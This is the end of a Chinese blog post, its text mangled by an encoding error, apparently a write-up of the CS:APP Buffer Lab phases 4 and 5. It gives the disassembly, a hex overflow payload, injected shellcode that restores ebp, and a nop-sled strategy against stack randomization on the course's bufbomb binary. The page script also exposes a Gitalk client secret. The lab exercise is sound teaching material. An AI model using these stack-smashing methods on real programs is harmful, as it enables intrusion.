<p>æ‰€ä»¥åœ¨getbufå¤„æº¢å‡ºçš„æ—¶å€™è®°å¾—æŠŠ 40-44 å­—èŠ‚çš„ebpæ•°æ®ç»™å¡«å›å»ï¼Œä½¿å¾—èƒ½å¤Ÿå›åˆ°testçš„æ ˆå¸§é‡Œç»§ç»­å®Œå¥½è¿è¡Œã€‚</p>
<p>é‚£ebpçš„å€¼æ€ä¹ˆå¾—åˆ°å‘¢ï¼Ÿ</p>
<p>gdbä¸­åœ¨ getbuf çš„ç¬¬ä¸€è¡Œ 0x080491f4 å¤„ä¸‹æ–­ç‚¹ï¼Œå› ä¸ºgetbufçš„ç¬¬ä¸€å¥å°±æ˜¯pushå‹æ ˆï¼Œä¿å­˜æ—§æ ˆå¸§testçš„ebpå€¼ã€‚</p>
<p>æŸ¥çœ‹å¾—åˆ°æ­¤æ—¶ ebp çš„å€¼ä¸ºï¼š 0x55683e70</p>
<p><code>ebpæ­¤æ—¶å†…å¿ƒç‹¬ç™½ï¼š&quot;æ²¡æƒ³åˆ°æˆ‘ä¹Ÿæœ‰è¢«é‡è§†çš„é‚£ä¸€å¤©ï¼å‘œå‘œ&quot;</code></p>
<p>ä¸”ç»è¿‡è°ƒè¯•ï¼Œæ ˆé¦–åœ°å€ä¸ºï¼š0x55683e18</p>
<p>æ‰€ä»¥æœ€ç»ˆçš„payloadæ•°æ®ä¸ºï¼š</p>
<pre><code class="c">B83CE51A1768BE8D
0408C30000000000
0000000000000000
0000000000000000
0000000000000000
703E6855183E6855</code></pre>
<p>ç»“æœï¼šæˆåŠŸï¼</p>
<pre><code class="c">highk@highk:~/csapp lab/buffer lab$ cat phase4.txt | ./bufbomb -u sixpar
Userid: sixpar
Cookie: 0x171ae53c
Type string:Boom!: getbuf returned 0x171ae53c
VALID
NICE JOB!</code></pre>
<h3 id="5-phase5ï¼š"><a href="#5-phase5ï¼š" class="headerlink" title="5.phase5ï¼š"></a>5.phase5ï¼š</h3><p>ä½¿ç”¨ -n å‚æ•°è¿è¡Œ bufbombï¼ˆå®é™…ä¼šè¿è¡Œtestnå‡½æ•°ä½“è€Œä¸æ˜¯testå‡½æ•°ä½“äº†ï¼‰ï¼Œç¨‹åºä¼šå¼€å¯æ ˆéšæœºåŒ–æ¥ç»„ç»‡æ”»å‡»ä»£ç ã€‚å› æ­¤éœ€è¦ç»•è¿‡æ ˆéšæœºåŒ–ã€‚</p>
<p>å› æ­¤æœ¬é¢˜æ˜¯testnå‡½æ•°å’Œgetbufnå‡½æ•°ï¼Œä¸”æ ˆå¤§å°æœ‰0x208ï¼ˆ520ï¼‰å­—èŠ‚ã€‚</p>
<p>å¹¶ä¸”å®éªŒæ‰‹å†Œä¸Šå†™ç€è¯´æ˜¯ä¼šè°ƒç”¨getbufnå‡½æ•° 5æ¬¡ï¼Œæˆ‘æ˜¯çœ‹ä¸å‡ºæ¥ä¸ºä»€ä¹ˆä¼šè°ƒç”¨5æ¬¡çš„?ä»£ç çœ‹ä¸å‡ºå•¥åå ‚ã€‚</p>
<p>æˆ‘éœ€è¦è¿ç»­è¾“å…¥äº”æ¬¡æ­£ç¡®çš„å­—ç¬¦ä¸²ï¼Œç¨‹åºå°†ä¼šå¯¹æ¯ä¸€æ¬¡è¾“å…¥è°ƒç”¨testnå‡½æ•°åè°ƒç”¨getbufnå‡½æ•°ï¼Œå…¶ä¸­ç”±äºåŠ å…¥äº†å¯¹æ ˆå¸§çš„æ‰°åŠ¨ï¼Œæ ˆå¸§çš„ç»å¯¹ä½ç½®ä¼šå‘ç”Ÿå˜åŒ–ï¼Œå› æ­¤ä¸èƒ½å†åƒä¸Šä¸€ä¸ªä»»åŠ¡é‚£æ ·è®°ä¸‹ebpçš„å€¼å†æ¢å¤ã€‚é‚£ä¹ˆï¼Œå¦‚ä½•åœ¨è°ƒç”¨æ”»å‡»ä»£ç æ—¶æ­£ç¡®åœ°æ¢å¤ebpçš„å€¼ï¼Œå¹¶è®©getbufnå‡½æ•°è¿”å›å€¼ä¸ºcookieï¼Œå¹¶ä¸”è¿”å›åˆ°testnå‡½æ•°å‘¢ï¼Ÿ</p>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬æ¥çœ‹testnå’Œgetbufnçš„ä»£ç ã€‚</p>
<pre><code class="c">gdb-peda$ disassemble testn
Dump of assembler code for function testn:
   0x08048e26 &lt;+0&gt;:        push   ebp
   0x08048e27 &lt;+1&gt;:        mov    ebp,esp
   0x08048e29 &lt;+3&gt;:        push   ebx  //esp-=0x4
   0x08048e2a &lt;+4&gt;:        sub    esp,0x24  //esp-=0x24
   0x08048e2d &lt;+7&gt;:        call   0x8048d90 &lt;uniqueval&gt;
   0x08048e32 &lt;+12&gt;:    mov    DWORD PTR [ebp-0xc],eax
   0x08048e35 &lt;+15&gt;:    call   0x804920c &lt;getbufn&gt;
   0x08048e3a &lt;+20&gt;:    mov    ebx,eax      //getbufå‡½æ•°è¿”å›åˆ°è¿™é‡Œ
   0x08048e3c &lt;+22&gt;:    call   0x8048d90 &lt;uniqueval&gt;
   0x08048e41 &lt;+27&gt;:    mov    edx,DWORD PTR [ebp-0xc]
   0x08048e44 &lt;+30&gt;:    cmp    eax,edx
   0x08048e46 &lt;+32&gt;:    je     0x8048e56 &lt;testn+48&gt;
   0x08048e48 &lt;+34&gt;:    mov    DWORD PTR [esp],0x804a388
   0x08048e4f &lt;+41&gt;:    call   0x80488c0 &lt;puts@plt&gt;
   0x08048e54 &lt;+46&gt;:    jmp    0x8048e9c &lt;testn+118&gt;
   0x08048e56 &lt;+48&gt;:    cmp    ebx,DWORD PTR ds:0x804d108
   0x08048e5c &lt;+54&gt;:    jne    0x8048e84 &lt;testn+94&gt;
   0x08048e5e &lt;+56&gt;:    mov    DWORD PTR [esp+0x8],ebx
   0x08048e62 &lt;+60&gt;:    mov    DWORD PTR [esp+0x4],0x804a3b4
   0x08048e6a &lt;+68&gt;:    mov    DWORD PTR [esp],0x1
   0x08048e71 &lt;+75&gt;:    call   0x80489c0 &lt;__printf_chk@plt&gt;
   0x08048e76 &lt;+80&gt;:    mov    DWORD PTR [esp],0x4
   0x08048e7d &lt;+87&gt;:    call   0x804937b &lt;validate&gt;
   0x08048e82 &lt;+92&gt;:    jmp    0x8048e9c &lt;testn+118&gt;
   0x08048e84 &lt;+94&gt;:    mov    DWORD PTR [esp+0x8],ebx
   0x08048e88 &lt;+98&gt;:    mov    DWORD PTR [esp+0x4],0x804a562
   0x08048e90 &lt;+106&gt;:    mov    DWORD PTR [esp],0x1
   0x08048e97 &lt;+113&gt;:    call   0x80489c0 &lt;__printf_chk@plt&gt;
   0x08048e9c &lt;+118&gt;:    add    esp,0x24
   0x08048e9f &lt;+121&gt;:    pop    ebx
   0x08048ea0 &lt;+122&gt;:    pop    ebp
   0x08048ea1 &lt;+123&gt;:    ret    </code></pre>
<p>getbufn:</p>
<pre><code class="c">gdb-peda$ disassemble getbufn
Dump of assembler code for function getbufn:
   0x0804920c &lt;+0&gt;:        push   ebp
   0x0804920d &lt;+1&gt;:        mov    ebp,esp   //ebp=esp
   0x0804920f &lt;+3&gt;:        sub    esp,0x218  //esp-=520
   0x08049215 &lt;+9&gt;:        lea    eax,[ebp-0x208]  //esp-=12
   0x0804921b &lt;+15&gt;:    mov    DWORD PTR [esp],eax  //eax=ebp-520
   0x0804921e &lt;+18&gt;:    call   0x8048cfa &lt;Gets&gt;
   0x08049223 &lt;+23&gt;:    mov    eax,0x1
   0x08049228 &lt;+28&gt;:    leave  
   0x08049229 &lt;+29&gt;:    ret </code></pre>
<p>è™½ç„¶æˆ‘ä»¬åœ¨å†™å­—ç¬¦ä¸²çš„è¿‡ç¨‹ä¸­ä¼šè¦†ç›–æ‰æ—§çš„ebpï¼Œä½¿å¾—getbufnç»“æŸè·³è½¬åˆ°æ”»å‡»ä»£ç æ—¶ebpçš„å€¼ä¸èƒ½æ­£å¸¸æ¢å¤ï¼Œä½†åœ¨getbufnçš„æœ€åï¼Œä¼šæœ‰leaveè¯­å¥ï¼Œå³ mov esp,ebpã€‚</p>
<p>è¦†ç›–æ‰äº†ebpæ²¡æœ‰å…³ç³»ï¼Œåæ­£è¿˜æœ‰espï¼Œåªè§espå·²ç»è¢«æ­£å¸¸æ¢å¤åˆ°testnè°ƒç”¨getbufnä¹‹å‰çš„çŠ¶æ€ï¼Œè€Œtestnä¸­ï¼Œesp = ebp - 24ï¼Œæ‰€ä»¥åªéœ€æ¢å¤ebpåˆ°esp + 24ã€‚</p>
<p>çœ‹åˆ°testnå¼€å¤´éƒ¨åˆ†çš„ä»£ç ï¼š</p>
<p>ebpä¸espåœ¨åŒä¸€ä¸ªèµ·è·‘çº¿ï¼Œç„¶åpushäº†ä¸€ä¸ªebxï¼Œæ‰€ä»¥espè¦å‡å»0x4ï¼Œå†æ‰‹åŠ¨åˆ†é…0x24ç©ºé—´ï¼Œæ‰€ä»¥espåˆè¦å‡å»0x24ï¼Œæ‰€ä»¥ä¸ä¸€å¼€å§‹çš„ebpæ¯”èµ·æ¥è¦å°‘ (0x24+0x4) å­—èŠ‚ã€‚</p>
<p>æ‰€ä»¥å¦‚æœè¿™æ—¶å€™<code>esp+0x28</code>ï¼Œé‚£ä¹ˆå°±å¯ä»¥å¾—åˆ°è°ƒç”¨getbufnå‡½æ•°ä¹‹å‰çš„æ—¶å€™ebpçš„å€¼å•¦ï¼ˆä¹Ÿå°±æ˜¯æˆ‘ä»¬å‹å…¥æ ˆå¸§é‡Œçš„é‚£ä¸ªebpå•¦ï¼‰ã€‚æˆ‘ä»¬è¦†ç›–äº†ebpæ²¡å…³ç³»ï¼Œåæ­£æ‰¾åˆ°å…¶æºå¤´å°±å¯ã€‚</p>
<p>æ‰€ä»¥æ’å…¥çš„æ±‡ç¼–ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="c">lea 0x28(%esp),%ebp
mov $0x171ae53c,%eax
push $0x08048e3a
ret</code></pre>
<p>è§£é‡Šï¼šæº¢å‡ºä¹‹åæ¢å¤ebpçš„å€¼ï¼Œç„¶åæ„é€ è¿”å›å€¼eaxä¸ºcookieï¼Œéšåè¿”å›åˆ°testnä¸­è°ƒç”¨getbufnå‡½æ•°çš„ä¸‹ä¸€è¡Œã€‚</p>
<pre><code class="c">highk@highk:~/csapp lab/buffer lab$ objdump -d phase5.o

phase5.oï¼š     æ–‡ä»¶æ ¼å¼ elf32-i386

Disassembly of section .text:

00000000 &lt;.text&gt;:
   0:    8d 6c 24 28              lea    0x28(%esp),%ebp
   4:    b8 3c e5 1a 17           mov    $0x171ae53c,%eax
   9:    68 3a 8e 04 08           push   $0x8048e3a
   e:    c3                       ret </code></pre>
<p>å¾—åˆ°æœºå™¨ç ä¸ºï¼š</p>
<pre><code class="c">8d 6c 24 28 b8 3c e5 1a 17 68 3a 8e 04 08 c3</code></pre>
<p>æœ¬é¢˜ç”±äºå¼€å¯äº†éšæœºåŒ–ï¼Œæ‰€ä»¥ä¸çŸ¥é“æˆ‘ä»¬çš„æ ˆé¦–åœ°å€åœ¨å“ªï¼Œæ‰€ä»¥æˆ‘ä»¬çš„shellcodeè¯­å¥è¦åˆ†å¸ƒåœ¨å“ªå‘¢ã€‚</p>
<p>å‡ ä¸ªæ ˆèµ·å§‹åœ°å€ï¼š</p>
<p>0x55686438</p>
<p>é¦–å…ˆæˆ‘ä»¬å¾—å¾—çŸ¥å¤§æ¦‚çš„èµ·å§‹åœ°å€èŒƒå›´ï¼š</p>
<p>gdbæ‰“å¼€ç¨‹åºï¼Œç„¶ååœ¨ 0x8049215 å¤„ä¸‹æ–­ç‚¹ï¼Œä¸ºä»€ä¹ˆè¦åœ¨è¿™é‡Œä¸‹æ–­ç‚¹å‘¢ï¼Ÿ</p>
<blockquote>
<p>0x08049215 &lt;+9&gt;:    lea    eax,[ebp-0x208]</p>
</blockquote>
<p>è¯¥è¯­å¥æ˜¯åœ¨è°ƒç”¨Getså‡½æ•°å‰çš„å‡†å¤‡è¯­å¥ï¼Œå¯ä»¥çœ‹åˆ°æ­¤æ—¶å®ƒä¼šå°†æ ˆçš„èµ·å§‹åœ°å€å³ebp-0x208åŠ è½½ç»™eaxï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥æŸ¥çœ‹æ­¤æ—¶çš„æ ˆçš„èµ·å§‹åœ°å€äº†ã€‚</p>
<blockquote>
<p>r -n -u sixpar</p>
</blockquote>
<p> è¿è¡Œèµ·è¯¥ç¨‹åºï¼Œç”±äºtestnå‡½æ•°ä½“ä¼šè¿è¡Œ5éï¼Œæ‰€ä»¥æ¯ä¸€éå°±éƒ½æ–­åœ¨0x8049215å¤„ï¼ŒæŸ¥çœ‹å®Œ ebp-0x208çš„åœ°å€åï¼Œå°±è¾“å…¥c ç»§ç»­ï¼Œç„¶åéšä¾¿è¾“å…¥ï¼ˆä¸è¾“å…¥ä¹Ÿè¡Œï¼Œç›´æ¥å›è½¦ï¼‰ï¼Œå›è½¦ï¼Œç„¶åå°±ä¼šæ–­åœ¨ä¸‹ä¸€éçš„0x8049215å¤„äº†ã€‚</p>
<blockquote>
<p>p ($ebp-0x208)</p>
</blockquote>
<p>æˆ‘è‡ªå·±è°ƒè¯•å¾—åˆ°çš„èµ·å§‹åœ°å€èŒƒå›´ï¼š</p>
<pre><code class="c">0x55683c38

0x55683c48

0x55683ca8 //è¯¥åœ°å€æœ€å¤§

0x55683bd8

0x55683bd8 //æœ€åä¸¤æ¬¡é‡å¤äº†å¯è¿˜è¡Œï¼Ÿ</code></pre>
<p>æ¥ä¸‹æ¥å°±è¦ç¡®å®šè¿”å›åœ°å€å¡«çš„è¯¥æ˜¯ä»€ä¹ˆåœ°å€äº†ã€‚</p>
<p>å› ä¸ºbufçš„åˆå§‹åœ°å€ä¸ç¡®å®šï¼Œæ‰€ä»¥åœ¨payloadä¸­å¡«å……çš„è·³è½¬åœ°å€åªèƒ½æ ¹æ®å®ƒçš„å¤§è‡´èŒƒå›´ç¡®å®šã€‚</p>
<p>æˆ‘ä»¬é€‰å–å¯èƒ½çš„bufèµ·å§‹åœ°å€èŒƒå›´ä¸­çš„<code>æœ€å¤§åœ°å€å€¼</code>ï¼š0x55683ca8ã€‚</p>
<p>å› ä¸ºæ ˆæ˜¯ä»åœ°å€é«˜å¤„ä¸‹é™çš„ï¼Œè€Œä»£ç æ˜¯æŒ‰æ­£å¸¸çš„åœ°å€é¡ºåºæ‰§è¡Œçš„ï¼Œæ‰€ä»¥ä½¿ç¨‹åºè¿”å›åˆ°æœ€å¤§çš„åœ°å€å°±å¯ä»¥ä½¿ç¨‹åºåœ¨è¿è¡Œæ”»å‡»ä»£ç ä¹‹å‰ä¸é‡åˆ°nopä»¥å¤–çš„æŒ‡ä»¤ã€‚ä¸è¿‡æˆ‘è¿˜æ˜¯å¬å¾—ä¸€æ„£ä¸€æ„£çš„ã€‚ä¸è¿‡åæ¥æˆ‘è‡ªå·±æ…¢æ…¢ç†è§£ï¼Œç»ˆäºæœ‰ç‚¹é¢†æ‚Ÿäº†ã€‚è¶Šé åï¼ˆåœ°å€è¶Šå¤§ï¼‰çš„æ ˆèµ·å§‹åœ°å€å°±è¶Šæœ‰å¯èƒ½å®Œå…¨åŒ…å«æˆ‘ä»¬æ„é€ çš„æ‰€æœ‰æ ˆæ•°æ®ï¼ˆå³ä½¿æœªå®Œå…¨åŒ…å«ä¹Ÿæ²¡äº‹ï¼Œæœ€èµ·ç åŒ…å«åˆ°nopå°±æ²¡äº‹ï¼Œç„¶åå°±ä¼šä¸€æ­¥æ­¥æ»‘ä¸‹å»ï¼Œç›´åˆ°æ‰§è¡Œæˆ‘ä»¬çš„shellcodeï¼‰ï¼Œé¿å…é‡åˆ°nopä¹‹å‰çš„å…¶ä»–æŒ‡ä»¤ã€‚</p>
<p>è¿™æ ·å½“bufç§»åŠ¨çš„æ—¶å€™ï¼Œç”±äº <code>nop sled</code> ï¼Œè¯¥åœ°å€å°†å¯ä»¥å‘½ä¸­ã€‚</p>
<p>æ‰€ä»¥æœ€åæ„é€ payloadï¼šæ€»å…±528ä¸ªå­—èŠ‚ï¼Œå…¶ä¸­æœ«å°¾4å­—èŠ‚æ˜¯æœ€å¤§çš„æ ˆèµ·å§‹åœ°å€0x55683ca8ï¼Œå€’æ•°ç¬¬äºŒä¸ª4å­—èŠ‚æ˜¯ebpçš„å€¼ï¼Œå¯ä»¥éšä¾¿è¦†ç›–æ²¡äº‹ï¼Œå› ä¸ºæˆ‘ä»¬åç»­æ ¹æ®espå’Œebpçš„å…³ç³»æŠŠebpçš„å€¼ç»™æ¢å¤è¿‡æ¥ã€‚å†å€’æ•°15ä¸ªå­—èŠ‚é‚£å°±æ˜¯æˆ‘ä»¬çš„shellcodeéƒ¨åˆ†äº†ã€‚ å…¶ä½™éƒ½ç”¨â€œ\x90â€ï¼ˆnopï¼‰å¡«å……ã€‚</p>
<p>å®éªŒç»“æœï¼š</p>
<pre><code class="c">highk@highk:~/csapp lab/buffer lab$ cat phase5.txt | ./hex2raw -n| ./bufbomb -n -u sixpar
Userid: sixpar
Cookie: 0x171ae53c
Type string:KABOOM!: getbufn returned 0x171ae53c
Keep going
Type string:KABOOM!: getbufn returned 0x171ae53c
Keep going
Type string:KABOOM!: getbufn returned 0x171ae53c
Keep going
Type string:KABOOM!: getbufn returned 0x171ae53c
Keep going
Type string:KABOOM!: getbufn returned 0x171ae53c
VALID
NICE JOB!</code></pre>
<p>é—²è¯ï¼šï¼ˆä¸€å¼€å§‹æˆ‘å¿˜äº†æŠŠå‰é¢500å¤šå­—èŠ‚çš„æ•°æ®æ”¹ä¸º\x90äº†ï¼Œå®³æˆ‘è¿·æƒ‘äº†ä¸€ä¼šï¼Œå‘ƒå‘ƒå‘ƒï¼Œå…¨éƒ½è¿˜æ˜¯\x00ï¼Œæ€ªä¸å¾—å®éªŒä¸æˆåŠŸå‘¢ã€‚ï¼‰</p>
<p>æ³¨æ„æœ¬é¢˜çš„æŒ‡ä»¤è¦åŠ  -nï¼š</p>
<blockquote>
<p>cat phase5.txt | ./hex2raw -n| ./bufbomb -n -u sixpar</p>
</blockquote>
<p>è¿™é‡Œç”±äºéœ€è¦åŠ -næ¥åº”å¯¹5æ¬¡è¾“å…¥ï¼Œæ‰€ä»¥æˆ‘ä¸å¾—ä»¥è¦åˆ©ç”¨hex2rawæ¥æŠŠåå…­è¿›åˆ¶æ•°æ®å˜ä¸ºå­—ç¬¦ä¸²ã€‚æ ¹æ®æç¤ºï¼ŒæŠŠphase5.txtæ–‡ä»¶é‡Œçš„åå…­è¿›åˆ¶æ•°æ®ç”¨ç©ºæ ¼éš”å¼€å³å¯ã€‚</p>
<h3 id="å…³äºbuffer-labçš„æ€»ç»“ï¼š"><a href="#å…³äºbuffer-labçš„æ€»ç»“ï¼š" class="headerlink" title="å…³äºbuffer labçš„æ€»ç»“ï¼š"></a>å…³äºbuffer labçš„æ€»ç»“ï¼š</h3><p>ä»Šå¤©èŠ±æ—¶é—´åšå®Œè¿™ä¸ªlabï¼Œå›é¡¾ä¸€ä¸‹å‘ç°éš¾åº¦è¿˜æ˜¯å¯ä»¥æ¥å—çš„ï¼Œä¹Ÿå­¦åˆ°äº†å¾ˆå¤šã€‚æ¥ä¸‹æ¥å‡ ä¸ªlabå¯èƒ½æ²¡é‚£ä¹ˆå¥½åšäº†ã€‚</p>
<p>åšå®Œè¿™ä¸ªlabï¼Œæ”¾å¼ çºªå¿µç…§ï¼š</p>
<p><img src="https://i.loli.net/2020/07/28/pI9Xw6K2t58VAqB.jpg" alt=""></p>
<p>æ—©ç¡æ—©èµ·èº«ä½“å¥½ã€‚</p>

      
       <hr><span style="font-style: italic;color: gray;"> è½¬è½½è¯·æ³¨æ˜æ¥æºï¼Œæ¬¢è¿æŒ‡å‡ºä»»ä½•æœ‰é”™è¯¯æˆ–ä¸å¤Ÿæ¸…æ™°çš„è¡¨è¾¾ã€‚å¯ä»¥åœ¨ä¸‹é¢è¯„è®ºåŒºè¯„è®ºå—·ã€‚ </span>
    </div>
</article>


<p>
    <a  class="dashang" onclick="dashangToggle()">ğŸ’°</a>
</p>




    <div id="comments"></div>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">

<script type="text/javascript">
    $.getScript('/js/gitalk.js', function () {
        var gitalk = new Gitalk({
            clientID: '1ce498b97d2ce45eead3',
            clientSecret: 'b9ceb4618f0ef4fa4abe92ef21a5c7d2b2fbc9cb',
            repo: 'ccjacoo.github.io',
            owner: 'ccjacoo',
            admin: ['ccjacoo'],
            id: decodeURI(location.pathname),
            distractionFreeMode: 'true',
            language: 'zh-CN',
            perPage: parseInt('10',10)
        })
        gitalk.render('comments')
    })
</script>




    




    </div>
    <div class="copyright">
        <p class="footer-entry">
    Â©2020 sixpar
</p>
<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>

    </div>
    <div class="full-toc">
        <button class="full" data-title="åˆ‡æ¢å…¨å± å¿«æ·é”® s"><span class="min "></span></button>
<a class="" id="rocket" ></a>

    </div>
</div>

<div class="hide_box" onclick="dashangToggle()"></div>
<div class="shang_box">
    <a class="shang_close"  onclick="dashangToggle()">Ã—</a>
    <div class="shang_tit">
        <p>Help us with donation</p>
    </div>
    <div class="shang_payimg">
        <div class="pay_img">
            <img src="/img/alipay.jpg" class="alipay" title="æ‰«ç æ”¯æŒ">
            <img src="/img/weixin.jpg" class="weixin" title="æ‰«ç æ”¯æŒ">
        </div>
    </div>
    <div class="shang_payselect">
        <span><label><input type="radio" name="pay" checked value="alipay">alipay</label></span><span><label><input type="radio" name="pay" value="weixin">weixin</label></span>
    </div>
</div>


</body>
<script src="/js/jquery.pjax.js?v=1.1.0" ></script>

<script src="/js/script.js?v=1.1.0" ></script>
<script>
    var img_resize = 'default';
    function initArticle() {
        /*æ¸²æŸ“å¯¹åº”çš„è¡¨æ ¼æ ·å¼*/
        
            $("#post .pjax table").addClass("green_title");
        

        /*æ¸²æŸ“æ‰“èµæ ·å¼*/
        
        $("input[name=pay]").on("click", function () {
            if($("input[name=pay]:checked").val()=="weixin"){
                $(".shang_box .shang_payimg .pay_img").addClass("weixin_img");
            } else {
                $(".shang_box .shang_payimg .pay_img").removeClass("weixin_img");
            }
        })
        

        /*é«˜äº®ä»£ç å—è¡Œå·*/
        
        $('pre code').each(function(){
            var lines = $(this).text().trim().split('\n').length, widther='';
            if (lines>99) {
                widther = 'widther'
            }
            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
            $(this).addClass('has-numbering ' + widther)
                    .parent()
                    .append($numbering);
            for(var i=1;i<=lines;i++){
                $numbering.append($('<li/>').text(i));
            }
        });
        

        /*è®¿é—®æ•°é‡*/
        
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
        

        /*ä»£ç é«˜äº®ï¼Œè¡Œå·å¯¹é½*/
        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));

        
        
    }

    /*æ‰“èµé¡µé¢éšè—ä¸å±•ç¤º*/
    
    function dashangToggle() {
        $(".shang_box").fadeToggle();
        $(".hide_box").fadeToggle();
    }
    

</script>

<!--åŠ å…¥è¡Œå·çš„é«˜äº®ä»£ç å—æ ·å¼-->

<style>
    pre{
        position: relative;
        margin-bottom: 24px;
        border-radius: 10px;
        border: 1px solid #e2dede;
        background: #FFF;
        overflow: hidden;
    }
    code.has-numbering{
        margin-left: 30px;
    }
    code.has-numbering.widther{
        margin-left: 35px;
    }
    .pre-numbering{
        margin: 0;
        position: absolute;
        top: 0;
        left: 0;
        width: 20px;
        padding: 0.5em 3px 0.7em 5px;
        border-right: 1px solid #C3CCD0;
        text-align: right;
        color: #AAA;
        background-color: ;
    }
    .pre-numbering.widther {
        width: 35px;
    }
</style>

<!--è‡ªå®šä¹‰æ ·å¼è®¾ç½®-->
<style>
    
    
    .nav {
        width: 542px;
    }
    .nav.fullscreen {
        margin-left: -542px;
    }
    .nav-left {
        width: 120px;
    }
    
    
    @media screen and (max-width: 1468px) {
        .nav {
            width: 492px;
        }
        .nav.fullscreen {
            margin-left: -492px;
        }
        .nav-left {
            width: 100px;
        }
    }
    
    
    @media screen and (max-width: 1024px) {
        .nav {
            width: 492px;
            margin-left: -492px
        }
        .nav.fullscreen {
            margin-left: 0;
        }
    }
    
    @media screen and (max-width: 426px) {
        .nav {
            width: 100%;
        }
        .nav-left {
            width: 100%;
        }
    }
    
    
    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
        color: #383636;
    }
    
    
    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
        color: #5e5e5f;
    }
    
    
    .nav-right nav a.hover, #local-search-result a.hover{
        background-color: #ECEAEA;
    }
    
    

    /*åˆ—è¡¨æ ·å¼*/
    

    /* èƒŒæ™¯å›¾æ ·å¼ */
    
    


    /*å¼•ç”¨å—æ ·å¼*/
    

    /*æ–‡ç« åˆ—è¡¨èƒŒæ™¯å›¾*/
    
    .nav-right:before {
        content: ' ';
        display: block;
        position: absolute;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        opacity: 0.5;
        background: url("https://i.loli.net/2020/07/04/kPifeO4vhSjdqE5.jpg");
        background-repeat: no-repeat;
        background-position: 50% 0;
        -ms-background-size: cover;
        -o-background-size: cover;
        -moz-background-size: cover;
        -webkit-background-size: cover;
        background-size: cover;
    }
    

    
</style>







</html>
